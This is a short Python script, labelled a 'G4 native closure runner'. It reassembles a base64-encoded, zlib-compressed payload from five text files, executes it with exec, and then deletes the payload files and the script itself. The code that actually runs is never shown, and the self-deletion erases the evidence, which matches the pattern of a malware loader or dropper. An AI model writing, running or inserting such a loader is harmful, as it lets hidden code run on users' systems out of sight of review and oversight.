#!/usr/bin/env python3
"""Transient deterministic G4 native closure runner."""
from __future__ import annotations
import base64
import zlib
from pathlib import Path

HERE = Path(__file__).resolve().parent
PARTS = [HERE / f"g4_payload_{index}.txt" for index in range(5)]
payload = "".join(part.read_text(encoding="ascii").strip() for part in PARTS)
source = zlib.decompress(base64.b64decode(payload, validate=True)).decode("utf-8")
exec(compile(source, __file__, "exec"), {"__name__": "__main__", "__file__": __file__})
for part in PARTS:
    part.unlink()
Path(__file__).unlink()
